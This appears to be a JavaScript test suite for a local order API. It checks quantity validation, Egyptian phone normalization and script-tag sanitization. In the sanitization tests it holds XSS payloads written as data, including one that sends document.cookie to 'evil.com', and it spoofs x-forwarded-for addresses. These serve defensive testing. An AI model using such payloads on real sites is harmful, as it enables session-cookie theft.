const assert = require('assert');

const BASE_URL = 'http://localhost:3001';

console.log('🔬 [CHALLENGER 1] Running In-Depth Empirical Re-Verification Matrix against ' + BASE_URL);

let ipCounter = 7000;
function nextIp() {
  ipCounter++;
  return `10.99.${Math.floor(ipCounter / 250)}.${(ipCounter % 250) + 1}`;
}

async function postOrder(payload, headers = {}) {
  const res = await fetch(`${BASE_URL}/api/orders`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      ...headers
    },
    body: JSON.stringify(payload)
  });
  const data = await res.json().catch(() => ({}));
  return { status: res.status, ok: res.ok, data };
}

const baseOrder = {
  customerName: 'فهد عبد العزيز العتيبي',
  phone: '01012345678',
  governorate: 'الجيزة',
  address: 'شارع الهرم الرئيسي، بجوار فندق مينا هاوس',
  notes: 'توصيل مسائي بعد الساعة 6',
  paymentMethod: 'COD',
  items: [{ id: 'prod-1', quantity: 1 }]
};

const suiteResults = {
  passed: 0,
  failed: 0,
  cases: []
};

async function test(name, fn) {
  try {
    const outcome = await fn();
    suiteResults.passed++;
    suiteResults.cases.push({ name, passed: true, outcome });
    console.log(`  ✅ [PASS] ${name}`);
    if (outcome) console.log(`     -> ${outcome}`);
  } catch (err) {
    suiteResults.failed++;
    suiteResults.cases.push({ name, passed: false, error: err.message });
    console.log(`  ❌ [FAIL] ${name}`);
    console.log(`     -> Error: ${err.message}`);
  }
}

async function run() {
  console.log('\n======================================================');
  console.log('TEST GROUP 1: FRACTIONAL & NON-INTEGER QUANTITY DEFECTS');
  console.log('======================================================');

  const invalidQuantities = [
    { label: 'quantity: 1.5 (float)', val: 1.5 },
    { label: 'quantity: 0.5 (sub-unit float)', val: 0.5 },
    { label: 'quantity: 1.0000000001 (tiny decimal)', val: 1.0000000001 },
    { label: 'quantity: 0.999999 (near 1 float)', val: 0.999999 },
    { label: 'quantity: 49.9 (fractional near max)', val: 49.9 },
    { label: 'quantity: true (boolean true)', val: true },
    { label: 'quantity: false (boolean false)', val: false },
    { label: 'quantity: [1] (single-element array)', val: [1] },
    { label: 'quantity: [1, 2] (multi-element array)', val: [1, 2] },
    { label: 'quantity: "1" (string integer)', val: "1" },
    { label: 'quantity: "1.5" (string float)', val: "1.5" },
    { label: 'quantity: null', val: null },
    { label: 'quantity: undefined (missing)', val: undefined },
    { label: 'quantity: NaN', val: NaN },
    { label: 'quantity: Infinity', val: Infinity },
    { label: 'quantity: -Infinity', val: -Infinity },
    { label: 'quantity: { value: 1 } (object)', val: { value: 1 } },
    { label: 'quantity: -1 (negative integer)', val: -1 },
    { label: 'quantity: 0 (zero integer)', val: 0 },
    { label: 'quantity: 51 (exceeds max 50)', val: 51 }
  ];

  for (const item of invalidQuantities) {
    await test(`Reject ${item.label} with HTTP 400`, async () => {
      const payload = {
        ...baseOrder,
        items: [{ id: 'prod-1', quantity: item.val }]
      };
      const res = await postOrder(payload, { 'x-forwarded-for': nextIp() });
      assert.strictEqual(
        res.status,
        400,
        `Expected 400 for ${item.label}, but got ${res.status}: ${JSON.stringify(res.data)}`
      );
      assert.strictEqual(res.data.ok, false);
      return `Correctly rejected: ${res.data.message}`;
    });
  }

  // Also verify valid integer boundaries
  await test('Accept quantity: 1 (minimum boundary)', async () => {
    const res = await postOrder({
      ...baseOrder,
      items: [{ id: 'prod-1', quantity: 1 }]
    }, { 'x-forwarded-for': nextIp() });
    assert.strictEqual(res.status, 200);
    assert.strictEqual(res.data.order.items[0].quantity, 1);
    return `Quantity 1 accepted, total: ${res.data.order.total}`;
  });

  await test('Accept quantity: 50 (maximum boundary)', async () => {
    const res = await postOrder({
      ...baseOrder,
      items: [{ id: 'prod-1', quantity: 50 }]
    }, { 'x-forwarded-for': nextIp() });
    assert.strictEqual(res.status, 200);
    assert.strictEqual(res.data.order.items[0].quantity, 50);
    return `Quantity 50 accepted, subtotal: ${res.data.order.subtotal}`;
  });

  console.log('\n======================================================');
  console.log('TEST GROUP 2: E.164 & INTERNATIONAL EGYPTIAN PHONE FORMATS');
  console.log('======================================================');

  const validPhones = [
    { raw: '+201012345678', expected: '01012345678', desc: '+20 Vodafone format' },
    { raw: '+201112345678', expected: '01112345678', desc: '+20 Etisalat format' },
    { raw: '+201212345678', expected: '01212345678', desc: '+20 Orange format' },
    { raw: '+201512345678', expected: '01512345678', desc: '+20 WE format' },
    { raw: '00201012345678', expected: '01012345678', desc: '0020 Vodafone format' },
    { raw: '00201112345678', expected: '01112345678', desc: '0020 Etisalat format' },
    { raw: '00201212345678', expected: '01212345678', desc: '0020 Orange format' },
    { raw: '00201512345678', expected: '01512345678', desc: '0020 WE format' },
    { raw: '201012345678', expected: '01012345678', desc: '20-prefixed 12-digit format' },
    { raw: '+20 10 1234 5678', expected: '01012345678', desc: 'International with spaces' },
    { raw: '+20-10-1234-5678', expected: '01012345678', desc: 'International with hyphens' },
    { raw: '+20(10)12345678', expected: '01012345678', desc: 'International with parens' },
    { raw: '01012345678', expected: '01012345678', desc: 'Standard local 11-digit format' },
    { raw: '011-1234-5678', expected: '01112345678', desc: 'Local with hyphens' },
    { raw: '012 1234 5678', expected: '01212345678', desc: 'Local with spaces' }
  ];

  for (const p of validPhones) {
    await test(`Accept ${p.desc} (${p.raw}) -> normalized to ${p.expected}`, async () => {
      const res = await postOrder({
        ...baseOrder,
        phone: p.raw
      }, { 'x-forwarded-for': nextIp() });

      assert.strictEqual(
        res.status,
        200,
        `Expected 200 for valid phone "${p.raw}", got ${res.status}: ${JSON.stringify(res.data)}`
      );
      assert.strictEqual(
        res.data.order.phone,
        p.expected,
        `Phone was not correctly normalized. Expected ${p.expected}, got ${res.data.order.phone}`
      );
      return `Normalized: "${p.raw}" -> "${res.data.order.phone}"`;
    });
  }

  const invalidPhones = [
    { raw: '+201312345678', desc: '+20 prefix with invalid mobile 013' },
    { raw: '+201412345678', desc: '+20 prefix with invalid mobile 014' },
    { raw: '+201612345678', desc: '+20 prefix with invalid mobile 016' },
    { raw: '+20101234567', desc: '+20 prefix with 9 digits (too short)' },
    { raw: '+2010123456789', desc: '+20 prefix with 11 digits (too long)' },
    { raw: '00201312345678', desc: '0020 prefix with invalid mobile 013' },
    { raw: '+966501234567', desc: 'Saudi phone number (+966)' },
    { raw: '+14155552671', desc: 'US phone number (+1)' },
    { raw: 'phone_number', desc: 'Non-numeric string' },
    { raw: '', desc: 'Empty phone' }
  ];

  for (const p of invalidPhones) {
    await test(`Reject invalid phone ${p.desc} (${p.raw}) with HTTP 400`, async () => {
      const res = await postOrder({
        ...baseOrder,
        phone: p.raw
      }, { 'x-forwarded-for': nextIp() });

      assert.strictEqual(
        res.status,
        400,
        `Expected 400 for invalid phone "${p.raw}", got ${res.status}`
      );
      assert.strictEqual(res.data.ok, false);
      return `Rejected: ${res.data.message}`;
    });
  }

  console.log('\n======================================================');
  console.log('TEST GROUP 3: SCRIPT TAG & CONTENT SANITIZATION DEFECTS');
  console.log('======================================================');

  // Test 3.1: Pure script tag with inner content must be completely removed, leaving empty/short string -> rejected 400
  await test('Reject pure script <script>alert(1)</script> with HTTP 400', async () => {
    const res = await postOrder({
      ...baseOrder,
      customerName: '<script>alert(1)</script>'
    }, { 'x-forwarded-for': nextIp() });

    assert.strictEqual(
      res.status,
      400,
      `Expected 400 for stripped script tag name, got ${res.status}: ${JSON.stringify(res.data)}`
    );
    assert.strictEqual(res.data.ok, false);
    return `Rejected as too short/empty: ${res.data.message}`;
  });

  // Test 3.2: Upper-case <SCRIPT>alert('pwn')</SCRIPT>
  await test('Reject uppercase <SCRIPT>alert("pwn")</SCRIPT> with HTTP 400', async () => {
    const res = await postOrder({
      ...baseOrder,
      customerName: '<SCRIPT>alert("pwn")</SCRIPT>'
    }, { 'x-forwarded-for': nextIp() });

    assert.strictEqual(res.status, 400);
    return `Rejected uppercase script payload with 400: ${res.data.message}`;
  });

  // Test 3.3: Script with attributes <script type="text/javascript" src="x">
  await test('Reject script with attributes <script type="text/javascript">document.cookie</script>', async () => {
    const res = await postOrder({
      ...baseOrder,
      customerName: '<script type="text/javascript">document.cookie</script>'
    }, { 'x-forwarded-for': nextIp() });

    assert.strictEqual(res.status, 400);
    return `Rejected script with attributes with 400: ${res.data.message}`;
  });

  // Test 3.4: Multiline script tag
  await test('Reject multiline script tag <script>\nalert(1)\n</script>', async () => {
    const res = await postOrder({
      ...baseOrder,
      customerName: '<script>\nalert(1)\n</script>'
    }, { 'x-forwarded-for': nextIp() });

    assert.strictEqual(res.status, 400);
    return `Rejected multiline script with 400: ${res.data.message}`;
  });

  // Test 3.5: Multiple script tags
  await test('Reject multiple script tags <script>1</script><script>2</script>', async () => {
    const res = await postOrder({
      ...baseOrder,
      customerName: '<script>1</script><script>2</script>'
    }, { 'x-forwarded-for': nextIp() });

    assert.strictEqual(res.status, 400);
    return `Rejected multiple scripts with 400: ${res.data.message}`;
  });

  // Test 3.6: Script embedded inside legitimate customer name
  await test('Strip script tag AND its body from embedded name without leaking "alert(1)"', async () => {
    const res = await postOrder({
      ...baseOrder,
      customerName: 'الأستاذ أحمد <script>alert(1)</script> كمال'
    }, { 'x-forwarded-for': nextIp() });

    assert.strictEqual(res.status, 200, `Expected 200, got ${res.status}: ${JSON.stringify(res.data)}`);
    const savedName = res.data.order.customerName;
    assert.ok(!savedName.includes('<script>'), 'Must not contain script opening tag');
    assert.ok(!savedName.includes('</script>'), 'Must not contain script closing tag');
    assert.ok(!savedName.includes('alert(1)'), `Must NOT contain script inner body "alert(1)", got: "${savedName}"`);
    assert.strictEqual(savedName, 'الأستاذ أحمد  كمال');
    return `Cleanly stripped script tag AND inner body: "${savedName}"`;
  });

  // Test 3.7: Script embedded inside address
  await test('Strip script tag AND its body from address field without leaking code', async () => {
    const res = await postOrder({
      ...baseOrder,
      address: 'شارع الهرم، الجيزة <script>fetch("http://evil.com?c="+document.cookie)</script> عمارة 15'
    }, { 'x-forwarded-for': nextIp() });

    assert.strictEqual(res.status, 200);
    const savedAddress = res.data.order.address;
    assert.ok(!savedAddress.includes('evil.com'), `Must NOT contain malicious URL body, got: "${savedAddress}"`);
    assert.ok(!savedAddress.includes('<script>'));
    return `Cleanly sanitized address: "${savedAddress}"`;
  });

  console.log('\n======================================================');
  console.log(`📊 FINAL RE-VERIFICATION RESULTS:`);
  console.log(`   ${suiteResults.passed} PASSED`);
  console.log(`   ${suiteResults.failed} FAILED`);
  console.log(`   Total Tests: ${suiteResults.cases.length}`);
  console.log('======================================================');

  if (suiteResults.failed > 0) {
    console.log('\n❌ FAILED TESTS:');
    suiteResults.cases.filter(c => !c.passed).forEach(c => {
      console.log(`   - ${c.name}: ${c.error}`);
    });
    process.exit(1);
  } else {
    console.log('\n🟢 ALL EMPIRICAL RE-VERIFICATION TESTS PASSED 100%!');
    process.exit(0);
  }
}

run().catch(err => {
  console.error('Fatal probe error:', err);
  process.exit(1);
});
